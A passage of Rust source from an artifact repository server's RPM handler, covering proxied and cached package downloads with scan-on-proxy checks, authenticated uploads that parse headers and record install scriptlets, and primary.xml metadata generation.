        // A `packages/{filename}.rpm` request under a published @N: resolve the
        // member from the FROZEN membership, serve the cached copy or fetch from
        // the curation-config upstream, VERIFY sha256 against the FROZEN
        // checksum, and stream — fail-closed on any mismatch.
        //
        // This is checked BEFORE the generic stored-blob serve on purpose: the
        // verified bytes are cached under `{prefix}/packages/{filename}`, which
        // the generic blob path would otherwise happily return as an opaque
        // `application/octet-stream` with no `X-Checksum-SHA256` — bypassing the
        // package response contract (content type, disposition, and the frozen
        // checksum a client validates against).
        if let Some(filename) = sub_path.strip_prefix("packages/") {
            if !filename.is_empty() && !filename.contains('/') {
                return serve_version_package(&state, &repo, &prefix, version_number, filename)
                    .await;
            }
        }

        // Frozen, AK-signed repodata blob?
        if let Some(resp) = serve_stored_publication_blob(&state, &repo, &prefix, &sub_path).await?
        {
            return Ok(resp);
        }

        // Nothing else is served from an immutable @N.
        return Err((StatusCode::NOT_FOUND, "Not found").into_response());
    }

    let filename = upstream_path.rsplit('/').next().unwrap_or(&upstream_path);

    // #3573: a Virtual repo walks its members in priority order, exactly as
    // `download_package` does for `/packages/`. Real yum layouts put repodata
    // and packages under a prefix (`el9/x86_64/repodata/repomd.xml`,
    // `9-stream/BaseOS/x86_64/os/Packages/...`), so every request dnf makes
    // against a Virtual over Remote members lands here — and the Remote-only
    // gate below 404'd all of them. The first member that serves the path
    // wins: hosted members are looked up by filename suffix, Remote members
    // proxy the path through their upstream. The shared helper applies the
    // caller-authorized member walk; it records a hosted-member serve, while a
    // Remote-member serve through a Virtual stays unrecorded (#1278), the same
    // as `/packages/`.
    if repo.repo_type == RepositoryType::Virtual {
        // #4112: scan-on-proxy over the Virtual's members.
        if let Some(served) =
            serve_scanned_rpm_download(&state, auth.as_ref(), &repo, &upstream_path, &ctx).await?
        {
            return served;
        }
        if let Some(resp) = proxy_helpers::try_remote_or_virtual_download(
            &state,
            auth.as_ref(),
            &repo,
            &ctx,
            proxy_helpers::DownloadResponseOpts {
                upstream_path: &upstream_path,
                virtual_lookup: proxy_helpers::VirtualLookup::PathSuffix(filename),
                default_content_type: "application/x-rpm",
                content_disposition_filename: Some(filename),
                suppress_upstream_proxy: false,
            },
        )
        .await?
        {
            return Ok(resp);
        }
        return Err((StatusCode::NOT_FOUND, "Not found").into_response());
    }

    // A normal (non-`@N`) request otherwise only serves from Remote repos.
    if repo.repo_type != RepositoryType::Remote {
        return Err((StatusCode::NOT_FOUND, "Not found").into_response());
    }

    // Cache hit by filename: serve the local copy.
    if let Some(hit) =
        proxy_helpers::find_local_by_filename_suffix(&state.db, repo.id, filename).await?
    {
        let artifact = sqlx::query!(
            "SELECT id, size_bytes, checksum_sha256, storage_key FROM artifacts WHERE id = $1",
            hit.id
        )
        .fetch_one(&state.db)
        .await
        .map_err(super::db_err)?;

        let storage = state
            .storage_for_repo(&repo.storage_location())
            .map_err(|e| e.into_response())?;
        crate::services::quarantine_service::check_artifact_download(&state.db, artifact.id)
            .await
            .map_err(|e| e.into_response())?;
        // Stream the local cache hit instead of buffering the whole .rpm in
        // memory (#1608, Core Invariant ①). Content-Length comes from the
        // stored `size_bytes` so we keep the exact byte count without reading
        // the object first. A missing storage key surfaces as AppError::NotFound
        // from `get_stream`, matching the storage NotFound contract (#1016).
        let stream = storage
            .get_stream(&artifact.storage_key)
            .await
            .map_err(|e| {
                (
                    StatusCode::INTERNAL_SERVER_ERROR,
                    crate::api::handlers::storage_err_message(&e),
                )
                    .into_response()
            })?;

        return Ok(build_rpm_package_response(
            Body::from_stream(stream),
            filename,
            artifact.size_bytes,
            &artifact.checksum_sha256,
        ));
    }

    // #4112: scan-on-proxy for the Remote's package files.
    if let Some(served) =
        serve_scanned_rpm_download(&state, auth.as_ref(), &repo, &upstream_path, &ctx).await?
    {
        return served;
    }

    let (upstream_url, proxy) = match (&repo.upstream_url, &state.proxy_service) {
        (Some(u), Some(p)) => (u, p),
        _ => return Err((StatusCode::NOT_FOUND, "Not found").into_response()),
    };

    // #3556: the repository's REAL format, not the `Generic` stand-in the
    // format-less helper synthesized. `upstream_path` here is the client's
    // request path relative to the repository root — the yum layout itself
    // (`Packages/foo-1.2-3.x86_64.rpm`, `el9/x86_64/repodata/repomd.xml`) —
    // which is exactly what `classify_rpm` reads. A `.rpm`/`.drpm` leaf is
    // version-pinned and becomes immutable instead of being re-fetched every
    // five minutes; `repomd.xml`, its `.asc`, and any unrecognised path stay on
    // the conservative mutable default, so this catch-all's metadata traffic is
    // unaffected.
    let response = proxy_helpers::proxy_fetch_streaming_with_disposition_and_format(
        proxy,
        repo.id,
        &repo_key,
        upstream_url,
        &upstream_path,
        "application/x-rpm",
        Some(filename),
        RepositoryFormat::Rpm,
    )
    .await?;
    // #3649: count the proxied serve. The streaming helper answers a warm
    // cache HIT from storage and a cold MISS from upstream through the same
    // call, so recording once it resolves counts both -- the cache hit #3649
    // reported as invisible included -- while a 404/502 still counts nothing.
    // Keyed on the proxy-cache path this fetch commits under, so the count
    // lines up with the catalog row the artifact listing renders.
    proxy_helpers::record_proxy_download(&state, repo.id, &repo_key, &upstream_path, &ctx).await;
    Ok(response)
}

// ---------------------------------------------------------------------------
// Scan-on-proxy (#4112)
// ---------------------------------------------------------------------------

/// Whether a proxied RPM path is repository metadata or signing material,
/// which streams unscanned like the Maven POM control: anything under a
/// `repodata/` directory, `repomd.xml` and its signature and key, the
/// installer tree descriptors, and key and signature files. Every other
/// file is gated: a package is graded as itself, and a file that is not an
/// RPM package is inconclusive.
fn rpm_path_is_metadata(path: &str) -> bool {
    let path = path.trim_start_matches('/');
    let file = path.rsplit('/').next().unwrap_or(path);
    path.split('/').any(|segment| segment == "repodata")
        || matches!(
            file,
            "repomd.xml"
                | "repomd.xml.asc"
                | "repomd.xml.key"
                | ".treeinfo"
                | "treeinfo"
                | "media.repo"
                | "TRANS.TBL"
        )
        || file.starts_with("RPM-GPG-KEY")
        || file.starts_with("GPG-KEY")
        || [".asc", ".sig", ".gpg", ".key"]
            .iter()
            .any(|suffix| file.ends_with(suffix))
}

/// The `(cache_key, scannable)` decision for an RPM proxy path (#4365 item 1).
fn rpm_serve_key(upstream_path: &str) -> crate::services::proxy_service::ProxyServeKey {
    crate::services::proxy_service::proxy_serve_key(upstream_path, |_| {
        !rpm_path_is_metadata(upstream_path)
    })
}

/// The RPM half of the generic gate (#4112): an `.rpm` must be the name,
/// version, release and architecture its file name names, and is graded as
/// that package of the release its dist tag names.
struct RpmPackage;

impl crate::api::handlers::proxy_scan_archive::ArchiveKind for RpmPackage {
    const LABEL: &'static str = "rpm package";
    const CONTENT_TYPE: &'static str = "application/x-rpm";

    fn requested(&self) -> String {
        "the package file name's name, version, release and architecture".to_string()
    }

    fn identity(
        &self,
        filename: &str,
        bytes: &Bytes,
    ) -> crate::api::handlers::proxy_scan_archive::ArchiveIdentity {
        rpm_identity(filename, bytes)
    }
}

/// What a proxied `.rpm` says about itself (#4112): its own header must name
/// the name, version, release and architecture of the requested file name.
/// It is then pinned as that package, at the header's
/// `[epoch:]version-release`, of the release the dist tag in its release
/// names (`el9_2` is RHEL 9); a package with no such tag is not graded as
/// anything.
fn rpm_identity(
    filename: &str,
    bytes: &Bytes,
) -> crate::api::handlers::proxy_scan_archive::ArchiveIdentity {
    use crate::api::handlers::proxy_scan_archive::{
        os_package_identity, read_rpm_identity, rpm_release_from_dist_tag, ArchiveIdentity,
    };
    let requested = filename
        .ends_with(".rpm")
        .then(|| RpmHandler::parse_rpm_filename(filename).ok())
        .flatten();
    let Some(requested) = requested else {
        return ArchiveIdentity::Unreadable(format!("{filename} is not an RPM package name"));
    };
    let header = match read_rpm_identity(bytes) {
        Ok(header) => header,
        Err(e) => return ArchiveIdentity::Unreadable(e),
    };
    if requested.name.as_deref() != Some(header.name.as_str())
        || requested.version.as_deref() != Some(header.version.as_str())
        || requested.release.as_deref() != Some(header.release.as_str())
        || requested.arch.as_deref() != Some(header.arch.as_str())
    {
        return ArchiveIdentity::Disagrees(format!(
            "the header declares {}-{}.{}",
            header.name,
            header.evr(),
            header.arch
        ));
    }
    os_package_identity(
        crate::services::scanner_service::ComponentEcosystem::Rpm,
        &header.name,
        &header.evr(),
        &header.arch,
        None,
        rpm_release_from_dist_tag(&header.release),
    )
}

/// Inline scan-and-block for one RPM proxy file from one Remote repository
/// (#4112).
async fn serve_scanned_rpm(
    state: &SharedState,
    proxy: &crate::services::proxy_service::ProxyService,
    (repo_id, repo_key, upstream_url): (uuid::Uuid, &str, &str),
    cache_key: &str,
    (action, severity_gate): proxy_helpers::MemberScanPolicy,
    ctx: &crate::api::middleware::download_telemetry::DownloadContext,
    disposition: Option<&str>,
) -> Result<Response, Response> {
    let filename = cache_key.rsplit('/').next().unwrap_or(cache_key);
    let req = proxy_helpers::ScannedProxyRequest {
        repo_id,
        repo_key,
        fetch_base: upstream_url,
        format: RepositoryFormat::Rpm,
        source_path: cache_key,
        cache_path: cache_key,
        filename,
        action,
        severity_gate,
        ctx: Some(ctx),
    };
    let file = crate::api::handlers::proxy_scan_archive::ScannedArchive {
        proxy,
        kind: RpmPackage,
        disposition,
    };
    proxy_helpers::serve_scanned_proxy_file(state, proxy, &req, &file).await
}

/// The scan-on-proxy arms of an RPM download, Remote and Virtual (#4112):
/// `Ok(None)` for repository metadata, or when nothing scans, so the caller
/// keeps its untouched path. A Virtual's hosted members are looked up by
/// file name, as the unscanned walk looks them up.
async fn serve_scanned_rpm_download(
    state: &SharedState,
    auth: Option<&AuthExtension>,
    repo: &RepoInfo,
    upstream_path: &str,
    ctx: &crate::api::middleware::download_telemetry::DownloadContext,
) -> Result<Option<Result<Response, Response>>, Response> {
    use crate::api::handlers::proxy_scan_archive::{LocalLookup, ScannedRoute};
    let serve_key = rpm_serve_key(upstream_path);
    if !serve_key.scannable {
        return Ok(None);
    }
    let Some(proxy) = state.proxy_service.as_deref() else {
        return Ok(None);
    };
    let cache_key = serve_key.cache_key.as_str();
    let filename = cache_key.rsplit('/').next().unwrap_or(cache_key);
    let route = ScannedRoute {
        upstream_path: cache_key,
        lookup: LocalLookup::PathSuffix(filename),
        default_content_type: "application/x-rpm",
        virtual_disposition: Some(filename),
    };
    crate::api::handlers::proxy_scan_archive::serve_scanned_package_download(
        state,
        auth,
        repo,
        route,
        false,
        ctx,
        |(id, key, upstream), policy, _disposition| async move {
            serve_scanned_rpm(
                state,
                proxy,
                (id, &key, &upstream),
                cache_key,
                policy,
                ctx,
                Some(filename),
            )
            .await
        },
    )
    .await
}

// ---------------------------------------------------------------------------
// GET /rpm/{repo_key}/packages/*path — Download RPM package
// ---------------------------------------------------------------------------

async fn download_package(
    State(state): State<SharedState>,
    Extension(auth): Extension<Option<AuthExtension>>,
    Path((repo_key, pkg_path)): Path<(String, String)>,
    ctx: crate::api::middleware::download_telemetry::DownloadContext,
) -> Result<Response, Response> {
    let repo = resolve_rpm_repo(&state.db, &repo_key).await?;
    // #4365 item 3: on a proxying repository the package path is the upstream
    // path and the proxy-cache key, so an ambiguous one is a 400 before
    // anything is fetched, scanned or not.
    proxy_helpers::reject_ambiguous_client_segments(
        repo.repo_type == RepositoryType::Remote || repo.repo_type == RepositoryType::Virtual,
        &[&pkg_path],
    )?;
    let depth = rpm_layout::depth(&state.db, repo.id)
        .await
        .map_err(IntoResponse::into_response)?;
    if depth > 0 {
        return depth_response(
            &state,
            auth.as_ref(),
            &repo,
            &format!("packages/{pkg_path}"),
            depth,
            &ctx,
        )
        .await;
    }

    let filename = pkg_path.rsplit('/').next().unwrap_or(&pkg_path);

    let hit =
        match proxy_helpers::find_local_by_filename_suffix(&state.db, repo.id, filename).await? {
            Some(a) => a,
            None => {
                let upstream_path = format!("packages/{}", pkg_path);
                // #4112: scan-on-proxy, Remote and Virtual. `None` when
                // nothing scans: the untouched path below serves.
                if let Some(served) =
                    serve_scanned_rpm_download(&state, auth.as_ref(), &repo, &upstream_path, &ctx)
                        .await?
                {
                    return served;
                }
                let (default_ct, cd_filename) = if repo.repo_type == RepositoryType::Virtual {
                    ("application/x-rpm", Some(filename))
                } else {
                    ("application/octet-stream", None)
                };
                if let Some(resp) = proxy_helpers::try_remote_or_virtual_download(
                    &state,
                    auth.as_ref(),
                    &repo,
                    &ctx,
                    proxy_helpers::DownloadResponseOpts {
                        upstream_path: &upstream_path,
                        virtual_lookup: proxy_helpers::VirtualLookup::PathSuffix(filename),
                        default_content_type: default_ct,
                        content_disposition_filename: cd_filename,
                        suppress_upstream_proxy: false,
                    },
                )
                .await?
                {
                    return Ok(resp);
                }
                return Err((StatusCode::NOT_FOUND, "Package not found").into_response());
            }
        };

    // RPM hit-path needs the SHA256 to emit X-Checksum-SHA256, so re-query
    // to pick up the checksum field that the lightweight helper omits.
    let artifact = sqlx::query!(
        "SELECT id, size_bytes, checksum_sha256, storage_key FROM artifacts WHERE id = $1",
        hit.id
    )
    .fetch_one(&state.db)
    .await
    .map_err(super::db_err)?;

    let storage = state
        .storage_for_repo(&repo.storage_location())
        .map_err(|e| e.into_response())?;
    // Check quarantine status before serving
    crate::services::quarantine_service::check_artifact_download(&state.db, artifact.id)
        .await
        .map_err(|e| e.into_response())?;

    let stream = storage
        .get_stream(&artifact.storage_key)
        .await
        .map_err(|e| {
            (
                StatusCode::INTERNAL_SERVER_ERROR,
                crate::api::handlers::storage_err_message(&e),
            )
                .into_response()
        })?;

    // Record download
    crate::services::artifact_service::record_download(&state.db, artifact.id, &ctx).await;

    Ok(build_rpm_package_response(
        Body::from_stream(stream),
        filename,
        artifact.size_bytes,
        &artifact.checksum_sha256,
    ))
}

// ---------------------------------------------------------------------------
// PUT /rpm/{repo_key}/packages/*path — Upload RPM package
// ---------------------------------------------------------------------------

async fn upload_package_put(
    State(state): State<SharedState>,
    Extension(auth): Extension<Option<AuthExtension>>,
    Path((repo_key, pkg_path)): Path<(String, String)>,
    headers: HeaderMap,
    UploadBody(body): UploadBody,
) -> Result<Response, Response> {
    // GHSA-vvc3-h39c-mrq5: enforce token scope before processing.
    let user_id = require_auth_basic_scope(auth, "rpm", "write:artifacts")?.user_id;
    let repo = resolve_rpm_repo(&state.db, &repo_key).await?;
    reject_rpm_write_if_not_hosted(&repo.repo_type)?;

    let filename = if rpm_layout::depth(&state.db, repo.id)
        .await
        .map_err(IntoResponse::into_response)?
        > 0
    {
        format!("packages/{pkg_path}")
    } else {
        pkg_path.rsplit('/').next().unwrap_or(&pkg_path).to_string()
    };

    if !filename.ends_with(".rpm") {
        return Err((StatusCode::BAD_REQUEST, "File must have .rpm extension").into_response());
    }

    store_rpm(&state, &repo, &filename, &headers, body, user_id).await
}

async fn upload_relative(
    State(state): State<SharedState>,
    Extension(auth): Extension<Option<AuthExtension>>,
    Path((repo_key, path)): Path<(String, String)>,
    headers: HeaderMap,
    UploadBody(body): UploadBody,
) -> Result<Response, Response> {
    let user_id = require_auth_basic_scope(auth, "rpm", "write:artifacts")?.user_id;
    let repo = resolve_rpm_repo(&state.db, &repo_key).await?;
    reject_rpm_write_if_not_hosted(&repo.repo_type)?;
    if rpm_layout::depth(&state.db, repo.id)
        .await
        .map_err(IntoResponse::into_response)?
        == 0
    {
        return Err((
            StatusCode::METHOD_NOT_ALLOWED,
            "Use the packages upload route at depth zero",
        )
            .into_response());
    }
    store_rpm(&state, &repo, &path, &headers, body, user_id).await
}

// ---------------------------------------------------------------------------
// POST /rpm/{repo_key}/upload — Upload RPM package (alternative)
// ---------------------------------------------------------------------------

async fn upload_package_post(
    State(state): State<SharedState>,
    Extension(auth): Extension<Option<AuthExtension>>,
    Path(repo_key): Path<String>,
    headers: HeaderMap,
    UploadBody(body): UploadBody,
) -> Result<Response, Response> {
    // GHSA-vvc3-h39c-mrq5: enforce token scope before processing.
    let user_id = require_auth_basic_scope(auth, "rpm", "write:artifacts")?.user_id;
    let repo = resolve_rpm_repo(&state.db, &repo_key).await?;
    reject_rpm_write_if_not_hosted(&repo.repo_type)?;

    // Try to get filename from Content-Disposition header, fall back to a hash-based name
    let filename = extract_rpm_filename(&headers, &body);

    if !filename.ends_with(".rpm") {
        return Err((StatusCode::BAD_REQUEST, "File must have .rpm extension").into_response());
    }

    store_rpm(&state, &repo, &filename, &headers, body, user_id).await
}

// ---------------------------------------------------------------------------
// Shared upload logic
// ---------------------------------------------------------------------------

async fn store_rpm(
    state: &SharedState,
    repo: &RepoInfo,
    path: &str,
    headers: &HeaderMap,
    content: Bytes,
    user_id: uuid::Uuid,
) -> Result<Response, Response> {
    let depth = rpm_layout::validate_upload(&state.db, repo.id, path)
        .await
        .map_err(IntoResponse::into_response)?;
    let filename = if depth > 0 {
        path.rsplit('/').next().unwrap_or(path)
    } else {
        path
    };
    if !filename.ends_with(".rpm") {
        return Err((StatusCode::BAD_REQUEST, "File must have .rpm extension").into_response());
    }
    let computed_sha256 = sha256_hex(&content);

    // Parse RPM filename for metadata
    let (pkg_name, pkg_version, release, arch) = parse_rpm_filename(filename).ok_or_else(|| {
        (
            StatusCode::BAD_REQUEST,
            format!(
                "Invalid RPM filename '{}'. Expected format: {{name}}-{{version}}-{{release}}.{{arch}}.rpm",
                filename
            ),
        )
            .into_response()
    })?;

    let full_version = build_rpm_full_version(&pkg_version, &release);
    let artifact_path = if depth > 0 {
        path.to_string()
    } else {
        build_rpm_artifact_path(filename)
    };

    // Parse the (untrusted) header before anything is stored: a header over
    // the indexing limits, or with XML-forbidden control characters, is
    // refused with 400 (#3801). The parse runs on the blocking pool — it is
    // linear, but proportional to the uploaded header.
    let (parsed_metadata, (scripts, unanalyzed, completeness)) = {
        let (name, bytes) = (filename.to_string(), content.clone());
        let (metadata, scriptlets) = tokio::task::spawn_blocking(move || {
            (
                build_rpm_artifact_metadata(&name, &bytes),
                extract_rpm_scriptlets(&bytes),
            )
        })
        .await
        .map_err(|e| {
            error!(error = %e, "RPM header parse task failed");
            (
                StatusCode::INTERNAL_SERVER_ERROR,
                "Failed to parse RPM header",
            )
                .into_response()
        })?;
        (
            metadata.map_err(|rejected| (StatusCode::BAD_REQUEST, rejected.0).into_response())?,
            scriptlets,
        )
    };

    proxy_helpers::ensure_unique_artifact_path(
        &state.db,
        repo.id,
        &artifact_path,
        "Package already exists",
    )
    .await?;

    let size_bytes = content.len() as i64;

    let artifact_id = if depth > 0 {
        let storage = state
            .storage_for_repo(&repo.storage_location())
            .map_err(IntoResponse::into_response)?;
        state
            .create_artifact_service(storage)
            .upload_with_sync_options(
                repo.id,
                &artifact_path,
                &pkg_name,
                Some(&full_version),
                "application/x-rpm",
                content.clone(),
                Some(user_id),
                // #4889: queue after the RPM metadata write below, not before
                // it.
                false,
            )
            .await
            .map_err(IntoResponse::into_response)?
            .id
    } else {
        let storage_key = build_rpm_storage_key(&repo.id, filename);
        proxy_helpers::put_artifact_bytes(state, repo, &storage_key, content.clone()).await?;
        let id = proxy_helpers::insert_artifact(
            &state.db,
            proxy_helpers::NewArtifact {
                repository_id: repo.id,
                path: &artifact_path,
                name: &pkg_name,
                version: &full_version,
                size_bytes,
                checksum_sha256: &computed_sha256,
                content_type: "application/x-rpm",
                storage_key: &storage_key,
                uploaded_by: user_id,
            },
        )
        .await?;
        // #4166: the ArtifactService branch above scans via finalize_upload;
        // this direct insert has to trigger scan-on-upload itself.
        crate::services::scanner_service::trigger_scan_on_upload(
            &state.db,
            state.scanner_service.clone(),
            repo.id,
            id,
        )
        .await;
        id
    };

    // Store RPM-specific metadata: filename-derived NEVRA enriched with the
    // parsed RPM header (summary, license, sourcerpm, ...) so primary.xml can
    // describe the package fully (#2588). The filename already parsed above,
    // so the builder always yields metadata here.
    let rpm_metadata = parsed_metadata
        .unwrap_or_else(|| build_rpm_metadata(&pkg_name, &pkg_version, &release, &arch, filename));

    if let Err(e) = record_rpm_metadata(&state.db, artifact_id, repo.id, &rpm_metadata).await {
        warn!(artifact_id = %artifact_id, error = %e, "RPM metadata could not be recorded");
    }

    // `%pre`/`%post`/`%preun`/`%postun` run as root on `dnf install` (#4033).
    // Best-effort: the artifact row is already committed, and a package with
    // no scriptlets still records a row so "none present" stays
    // distinguishable from "never looked".
    debug_assert!(
        scripts
            .iter()
            .chain(unanalyzed.iter().map(|u| &u.script))
            .all(|s| s.kind.runs_as_root()),
        "rpm scriptlets are root-privileged hooks"
    );
    if let Err(e) = record_install_scripts(
        &state.db,
        artifact_id,
        "rpm",
        scripts,
        unanalyzed,
        completeness,
    )
    .await
    {
        warn!(
            artifact_id = %artifact_id,
            error = %e,
            "rpm scriptlet analysis could not be recorded"
        );
    }

    // Surface the package on the Packages page (#3659), keyed on the RPM's
    // NEVRA name and `version-release`, with the RPM header's summary where
    // the header parsed.
    let description = rpm_metadata
        .get("summary")
        .and_then(|v| v.as_str())
        .filter(|d| !d.is_empty());
    if depth > 0 {
        // ArtifactService already emitted artifact.uploaded; only enrich the catalog.
        crate::services::package_service::PackageService::new(state.db.clone())
            .try_create_or_update_from_artifact(
                repo.id,
                &pkg_name,
                &full_version,
                size_bytes,
                &computed_sha256,
                description,
                Some(serde_json::json!({"format":"rpm"})),
            )
            .await;

        // #4889: the nested-layout branch used to queue inside
        // `upload_with_sync_options`, before `record_rpm_metadata` ran below.
        // Queue here instead so the task can carry the RPM document.
        super::queue_push_sync_tasks_for_upload(
            &state.db,
            headers,
            repo.id,
            artifact_id,
            &artifact_path,
            size_bytes,
        )
        .await;
    } else {
        crate::services::package_service::register_published_package(
            &state.db,
            &state.event_bus,
            repo.id,
            "rpm",
            &pkg_name,
            &full_version,
            size_bytes,
            &computed_sha256,
            description,
        )
        .await;

        // #4725: fan out to subscribed push peers.
        super::queue_push_sync_tasks_for_upload(
            &state.db,
            headers,
            repo.id,
            artifact_id,
            &artifact_path,
            size_bytes,
        )
        .await;
    }

    info!(
        "RPM upload: {}-{}-{}.{}.rpm to repo {}",
        pkg_name, pkg_version, release, arch, repo.id
    );

    Ok(Response::builder()
        .status(StatusCode::CREATED)
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(
            build_rpm_upload_response(
                &pkg_name,
                &pkg_version,
                &release,
                &arch,
                &computed_sha256,
                size_bytes,
            )
            .to_string(),
        ))
        .unwrap())
}

// ---------------------------------------------------------------------------
// Path/key builders (single source of truth; unit tests pin these against
// hardcoded literals so a format change here fails the tests — #2657)
// ---------------------------------------------------------------------------

/// Build the artifact path for an RPM package.
fn build_rpm_artifact_path(filename: &str) -> String {
    format!("packages/{}", filename)
}

/// Build the storage key for an RPM package.
fn build_rpm_storage_key(repo_id: &uuid::Uuid, filename: &str) -> String {
    format!("rpm/{}/{}", repo_id, filename)
}

/// Build the full version string from version and release.
pub(crate) fn build_rpm_full_version(version: &str, release: &str) -> String {
    format!("{}-{}", version, release)
}

/// Build the filename-derived RPM metadata JSON (fallback when the RPM header
/// cannot be parsed).
pub(crate) fn build_rpm_metadata(
    name: &str,
    version: &str,
    release: &str,
    arch: &str,
    filename: &str,
) -> serde_json::Value {
    serde_json::json!({
        "name": name,
        "version": version,
        "release": release,
        "arch": arch,
        "filename": filename,
    })
}

/// Build the upload response JSON.
fn build_rpm_upload_response(
    name: &str,
    version: &str,
    release: &str,
    arch: &str,
    sha256: &str,
    size: i64,
) -> serde_json::Value {
    serde_json::json!({
        "name": name,
        "version": version,
        "release": release,
        "arch": arch,
        "sha256": sha256,
        "size": size,
    })
}

/// Extract RPM filename from headers, falling back to a hash-based name
/// derived from the body (hashed only when no header names the file).
fn extract_rpm_filename(headers: &HeaderMap, body: &[u8]) -> String {
    headers
        .get("Content-Disposition")
        .and_then(|v| v.to_str().ok())
        .and_then(|v| {
            v.split("filename=")
                .nth(1)
                .map(|f| f.trim_matches('"').trim_matches('\'').to_string())
        })
        .or_else(|| {
            headers
                .get("X-Package-Filename")
                .and_then(|v| v.to_str().ok())
                .map(|s| s.to_string())
        })
        .unwrap_or_else(|| {
            let hash = sha256_hex(body);
            format!("{}.rpm", &hash[..16])
        })
}

// ---------------------------------------------------------------------------
// XML generation helpers
// ---------------------------------------------------------------------------

/// Each artifact's current repodata block, deserialized once.
fn repodata_infos(artifacts: &[RpmArtifact]) -> Vec<Option<crate::formats::rpm::RpmRepodataInfo>> {
    artifacts.iter().map(rpm_repodata_info).collect()
}

#[cfg(test)]
fn generate_primary_xml(artifacts: &[RpmArtifact]) -> String {
    generate_primary_xml_with(artifacts, &repodata_infos(artifacts), "")
}

/// `primary.xml` for `artifacts`; `prefix` is the metadata root (`""` at
/// depth zero, `"<root>/"` otherwise) that every `<location href>` is made
/// relative to (#4216).
#[cfg(test)]
fn generate_primary_xml_with(
    artifacts: &[RpmArtifact],
    infos: &[Option<crate::formats::rpm::RpmRepodataInfo>],
    prefix: &str,
) -> String {
    let mut xml = primary_xml_header(artifacts.len());
    for (artifact, info) in artifacts.iter().zip(infos) {
        push_primary_package(&mut xml, artifact, info, prefix);
    }
    xml.push_str("</metadata>\n");
    xml
}

/// The opening of `primary.xml` for a document listing `packages` packages.
fn primary_xml_header(packages: usize) -> String {
    format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<metadata xmlns="http://linux.duke.edu/metadata/common" xmlns:rpm="http://linux.duke.edu/metadata/rpm" packages="{}">
"#,
        packages
    )
}

/// Append one package's `primary.xml` element. Shared by the whole-slice generator
/// and the streaming render (#4544), so both emit the same bytes.
fn push_primary_package(
    xml: &mut String,
    artifact: &RpmArtifact,
    info: &Option<crate::formats::rpm::RpmRepodataInfo>,
    prefix: &str,
) {
    let filename = artifact.path.rsplit('/').next().unwrap_or(&artifact.path);

    // Extract metadata from artifact_metadata if available, else parse filename
    let (name, version, release, arch, summary) = if let Some(ref meta) = artifact.metadata {
        (
            meta.get("name")
                .and_then(|v| v.as_str())
                .unwrap_or(&artifact.name)
                .to_string(),
            meta.get("version")
                .and_then(|v| v.as_str())
                .unwrap_or("0")
                .to_string(),
            meta.get("release")
                .and_then(|v| v.as_str())
                .unwrap_or("1")
                .to_string(),
            meta.get("arch")
                .and_then(|v| v.as_str())
                .unwrap_or("noarch")
                .to_string(),
            meta.get("summary")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string(),
        )
    } else if let Some((n, v, r, a)) = parse_rpm_filename(filename) {
        (n, v, r, a, String::new())
    } else {
        (
            artifact.name.clone(),
            artifact.version.clone().unwrap_or_else(|| "0".to_string()),
            "1".to_string(),
            "noarch".to_string(),
            String::new(),
        )
    };

    // Header-derived fields recorded at upload time (#2588). Blank when the
    // artifact predates header extraction or the header was unparseable.
    let meta_str = |key: &str| -> String {
        artifact
            .metadata
            .as_ref()
            .and_then(|m| m.get(key))
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string()
    };
    let description = meta_str("description");
    let url = meta_str("url");
    let license = meta_str("license");
    let source_rpm = meta_str("source_rpm");

    // The hosted RPM route serves packages under `packages/<file>` (see the
    // `/rpm/{repo}/{path}` handler). Artifacts uploaded through the native
    // RPM PUT already carry a `packages/`-prefixed path, but ones pushed via
    // the generic upload flow are stored at their bare path. Emit a location
    // that always matches the download route so both upload paths resolve.
    let location = if !prefix.is_empty() {
        rpm_layout::location_href(
            artifact
                .path
                .strip_prefix(prefix)
                .expect("query scoped to root"),
        )
    } else if artifact.path.starts_with("packages/") {
        artifact.path.clone()
    } else {
        build_rpm_artifact_path(filename)
    };

    // Header-derived repodata block (#3801): dependencies, file list,
    // sizes, header range. Absent only for packages whose header could
    // not be parsed at upload and has not been healed since.
    // Header-derived block, deserialized once per render.
    let info = info.as_ref();
    let epoch = info.and_then(|i| i.epoch).unwrap_or(0);
    let group = meta_str("group");

    // Element order is createrepo_c's: name, arch, version, checksum,
    // summary, description, packager, url, time, size, location, format.
    xml.push_str("  <package type=\"rpm\">\n");
    xml.push_str(&format!("    <name>{}</name>\n", xml_escape(&name)));
    xml.push_str(&format!("    <arch>{}</arch>\n", xml_escape(&arch)));
    xml.push_str(&format!(
        "    <version epoch=\"{epoch}\" ver=\"{}\" rel=\"{}\"/>\n",
        xml_escape(&version),
        xml_escape(&release),
    ));
    xml.push_str(&format!(
        "    <checksum type=\"sha256\" pkgid=\"YES\">{}</checksum>\n",
        artifact.checksum_sha256
    ));
    xml.push_str(&format!(
        "    <summary>{}</summary>\n",
        xml_escape(&summary)
    ));
    xml.push_str(&format!(
        "    <description>{}</description>\n",
        xml_escape(&description)
    ));
    // createrepo_c writes <packager>, <url>, <rpm:vendor>, <rpm:group>
    // and <rpm:buildhost> even when the header has no value (empty).
    let packager = info.and_then(|i| i.packager.as_deref()).unwrap_or("");
    xml.push_str(&format!(
        "    <packager>{}</packager>\n",
        xml_escape(packager)
    ));
    xml.push_str(&format!("    <url>{}</url>\n", xml_escape(&url)));
    xml.push_str(&format!(
        "    <time file=\"{}\" build=\"{}\"/>\n",
        artifact.updated_at.timestamp(),
        info.and_then(|i| i.build_time).unwrap_or(0)
    ));
    let installed = info.and_then(|i| i.installed_size).unwrap_or(0);
    match info.and_then(|i| i.archive_size) {
        Some(archive) => xml.push_str(&format!(
            "    <size package=\"{}\" installed=\"{installed}\" archive=\"{archive}\"/>\n",
            artifact.size_bytes
        )),
        None => xml.push_str(&format!(
            "    <size package=\"{}\" installed=\"{installed}\"/>\n",
            artifact.size_bytes
        )),
    }
    xml.push_str(&format!(
        "    <location href=\"{}\"/>\n",
        xml_escape(&location)
    ));

    xml.push_str("    <format>\n");
    xml.push_str(&format!(
        "      <rpm:license>{}</rpm:license>\n",
        xml_escape(&license)
    ));
    let vendor = info.and_then(|i| i.vendor.as_deref()).unwrap_or("");
    xml.push_str(&format!(
        "      <rpm:vendor>{}</rpm:vendor>\n",
        xml_escape(vendor)
    ));
    xml.push_str(&format!(
        "      <rpm:group>{}</rpm:group>\n",
        xml_escape(&group)
    ));
